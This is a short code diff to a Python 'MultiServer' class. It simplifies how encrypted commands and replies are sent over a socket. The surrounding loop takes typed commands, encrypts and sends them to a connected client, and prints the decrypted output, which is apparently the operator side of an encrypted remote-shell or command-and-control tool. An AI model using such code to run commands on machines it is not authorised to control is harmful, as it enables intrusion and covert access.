@@ -189,7 +189,7 @@ class MultiServer(object):
         :param conn: 
         :param target: 
         """
-        conn.send(str.encode(self.Crypt.encrypt(" ".encode(encoding="utf-8")).decode(encoding="utf-8")))
+        conn.send(self.Crypt.encrypt(b" "))
         cwd_bytes = self.Crypt.decrypt(self.read_command_output(conn))
         cwd = str(cwd_bytes, "utf-8")
         print(cwd, end="")
@@ -197,7 +197,7 @@ class MultiServer(object):
             try:
                 cmd = input()
                 if len(str.encode(cmd)) > 0:
-                    conn.send(str.encode(self.Crypt.encrypt(cmd.encode("utf-8")).decode("utf-8")))
+                    conn.send(self.Crypt.encrypt(cmd.encode("utf-8")))
                     cmd_output = self.Crypt.decrypt(self.read_command_output(conn))
                     client_response = str(cmd_output, "utf-8")
                     print(client_response, end="")
